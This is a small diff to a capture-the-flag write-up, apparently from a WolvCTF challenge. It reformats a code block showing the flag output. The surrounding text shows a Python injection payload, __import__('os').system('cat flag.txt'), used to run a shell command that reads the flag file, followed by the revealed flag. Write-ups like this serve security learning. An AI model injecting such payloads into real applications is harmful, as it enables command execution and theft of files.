@@ -13,7 +13,8 @@ You lost lol
 ```
 Then we input ```__import__('os').system('cat flag.txt')```
 We get:
-```wctf{Why_Gu3ss_Wh3n_Y0u_C4n_CH34T}
+```
+    wctf{Why_Gu3ss_Wh3n_Y0u_C4n_CH34T}
     You lost lol
 ```
 
